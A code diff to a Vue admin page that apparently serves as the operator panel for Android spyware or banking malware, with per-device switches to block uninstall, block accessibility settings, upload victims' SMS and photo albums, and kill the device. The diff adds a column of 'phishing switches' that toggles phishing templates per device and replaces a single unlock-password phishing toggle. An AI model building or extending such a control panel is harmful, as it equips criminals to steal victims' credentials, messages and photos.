@@ -43,17 +43,9 @@
       </el-form-item>
 
       <el-form-item>
-        <el-date-picker
-          v-model="lastActivityTimeRange"
-          type="datetimerange"
-          range-separator="至"
-          start-placeholder="开始时间"
-          end-placeholder="结束时间"
-          format="YYYY-MM-DD HH:mm:ss"
-          value-format="x"
-          @change="onLastActivityTimeChange"
-          style="width: 360px"
-        />
+        <el-date-picker v-model="lastActivityTimeRange" type="datetimerange" range-separator="至"
+          start-placeholder="开始时间" end-placeholder="结束时间" format="YYYY-MM-DD HH:mm:ss" value-format="x"
+          @change="onLastActivityTimeChange" style="width: 360px" />
       </el-form-item>
 
 
@@ -96,15 +88,24 @@
             @update:model-value="updateDeviceSwitch(scope.row, 'uninstallGuard', $event)" />
           <el-switch inactive-text="阻止无障碍" :model-value="!!scope.row.accessibilityGuard"
             @update:model-value="updateDeviceSwitch(scope.row, 'accessibilityGuard', $event)" />
-          <el-switch inactive-text="解锁密码钓鱼" :model-value="!!scope.row.unlockFish" @update:model-value="updateDeviceSwitch(scope.row, 'unlockFish', $event)" />
+          <!-- <el-switch inactive-text="解锁密码钓鱼" :model-value="!!scope.row.unlockFish"
+            @update:model-value="updateDeviceSwitch(scope.row, 'unlockFish', $event)" /> -->
           <el-switch inactive-text="Kill状态" :model-value="!!scope.row.kill"
             @update:model-value="updateDeviceSwitch(scope.row, 'kill', $event)" />
 
-            <el-switch inactive-text="上传短信" :model-value="!!scope.row.uploadSms"
+          <el-switch inactive-text="上传短信" :model-value="!!scope.row.uploadSms"
             @update:model-value="updateDeviceSwitch(scope.row, 'uploadSms', $event)" />
 
-            <el-switch inactive-text="上传相册" :model-value="!!scope.row.uploadAlbum"
+          <el-switch inactive-text="上传相册" :model-value="!!scope.row.uploadAlbum"
             @update:model-value="updateDeviceSwitch(scope.row, 'uploadAlbum', $event)" />
+
+        </template>
+      </el-table-column>
+
+      <el-table-column label="钓鱼开关" header-align="center" align="right" width="150px">
+        <template v-slot="scope">
+          <el-switch v-for="item in fishTemplateList" :key="item.code" :inactive-text="item.label" :model-value="scope.row.fishSwitch && !!scope.row.fishSwitch[item.code]"
+          @update:model-value="updateFishSwitch(scope.row, item.code, $event)" />
 
         </template>
       </el-table-column>
@@ -170,7 +171,7 @@
     <DeviceDetail ref="deviceDetail" @wakeup="wakeup"></DeviceDetail>
     <!-- 输入日志弹窗 -->
     <el-dialog v-model="inputLogVisible" :title="`输入日志 - 设备ID: ${currentDevice.deviceId} 包名: ${currentDevice.pkg}`"
-    width="970px" :close-on-click-modal="false" class="input-log-dialog">
+      width="970px" :close-on-click-modal="false" class="input-log-dialog">
       <div class="log-header">
         <div class="header-row">
           <div class="query-controls">
@@ -292,6 +293,7 @@ export default defineComponent({
       }
     });
     const deviceId = ref("");
+    const fishTemplateList = ref<any[]>([]);
     const inputLogVisible = ref(false);
     const logLoading = ref(false);
     const inputLogList = ref([]);
@@ -343,7 +345,8 @@ export default defineComponent({
       currentSmsDevice,
       albumListVisible,
       currentAlbumDevice,
-      lastActivityTimeRange
+      lastActivityTimeRange,
+      fishTemplateList
     };
   },
   async mounted() {
@@ -356,8 +359,17 @@ export default defineComponent({
     this.dataForm.end = now;
     // 自动执行一次查询
     this.getDataList();
+    await this.fetchFishTemplateList();
   },
   methods: {
+    async fetchFishTemplateList() {
+      let { code, data, msg } = await baseService.post("/device/fishCodeList");
+      if (code == 0) {
+        this.fishTemplateList = data;
+      } else {
+        ElMessage.error(msg || "获取钓鱼模板失败");
+      }
+    },
     enterScreen(row: any) {
       this.deviceId = row.deviceId;
       (this.$refs as any).deviceDetail.show(row);
@@ -511,6 +523,33 @@ export default defineComponent({
 
       return `${year}-${month}-${day} ${hours}:${minutes}:${seconds}`;
     },
+    async updateFishSwitch(row: any, field: string, value: boolean) {
+
+      try {
+        const { success, msg } = await baseService.post(
+          "/device/updateFishSwitch",
+          {
+            id: row.id,
+            code: field,
+            value: value
+          },
+          undefined,
+          true
+        );
+        if (success) {
+          ElMessage.success("更新成功");
+          this.getDataList();
+        } else {
+          ElMessage.error(msg || "更新失败");
+          
+        }
+      } catch (error) {
+        ElMessage.error("更新失败");
+     
+      }
+
+
+    },
     async updateDeviceSwitch(row: any, field: string, value: boolean) {
       // 将 boolean 转换为 int (true -> 1, false -> 0)
       const intValue = value ? 1 : 0;
@@ -626,7 +665,7 @@ export default defineComponent({
   flex-wrap: nowrap;
 }
 
-.action-buttons.compact .el-button + .el-button {
+.action-buttons.compact .el-button+.el-button {
   margin-left: 4px;
 }
 
